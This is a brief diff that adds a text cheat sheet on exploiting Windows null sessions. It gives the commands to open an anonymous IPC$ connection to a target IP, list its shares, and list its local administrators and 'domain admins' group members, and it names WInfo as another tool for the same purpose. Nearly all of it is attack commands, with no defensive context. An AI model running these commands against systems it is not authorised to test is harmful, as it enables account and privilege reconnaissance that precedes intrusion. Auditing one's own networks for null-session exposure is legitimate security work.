@@ -1,0 +1,15 @@
+How to create a null session:
+------------------------------
+net use \\IP_ADDRESS\ipc$ "" /user:""
+
+How to access shares after creation of null session:
+net view \\IP_ADDRESS
+
+How to list administrators after creation of null session:
+local administrators \\IP_ADDRESS
+
+How to list group members in "domain admins" after creation of null session:
+global "domain admins" \\IP_ADDRESS
+
+The utilities local.exe and global.exe. They are part of the Windows NT Resource Kit. WInfo is a 3rd party utility that also can exploit null sessions.
+
